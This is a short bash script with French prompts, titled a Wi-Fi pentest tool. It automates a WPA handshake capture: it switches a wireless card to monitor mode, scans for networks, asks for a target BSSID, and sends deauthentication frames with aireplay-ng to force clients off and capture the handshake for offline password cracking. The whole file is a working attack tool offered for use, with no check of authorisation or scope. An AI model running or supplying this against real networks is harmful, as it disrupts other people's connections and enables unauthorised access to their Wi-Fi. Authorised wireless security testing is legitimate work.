#!/bin/bash
# wifi_pentest.sh - Scan & capture WPA handshake
set -euo pipefail

INTERFACE="wlan0"
MONITOR_IF="wlan0mon"
OUTPUT_DIR="wifi_captures"
CHANNEL=6  # à adapter selon le réseau cible

mkdir -p "$OUTPUT_DIR"

echo "[*] Activation du mode monitor sur $INTERFACE..."
airmon-ng start "$INTERFACE"

echo "[*] Lancement du scan des réseaux disponibles..."
timeout 20s airodump-ng "$MONITOR_IF"

read -p "Entrez le BSSID cible : " BSSID
read -p "Entrez le nom (SSID) du réseau : " ESSID

echo "[*] Capture du handshake sur $ESSID ($BSSID)..."
airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$OUTPUT_DIR/handshake" "$MONITOR_IF" &

sleep 5
echo "[*] Déauthentification d’un client pour forcer handshake..."
aireplay-ng --deauth 5 -a "$BSSID" "$MONITOR_IF"

echo "[*] Attente du handshake..."
sleep 20
pkill airodump-ng

echo "✅ Capture terminée. Fichier : $OUTPUT_DIR/handshake.cap"
airmon-ng stop "$MONITOR_IF"
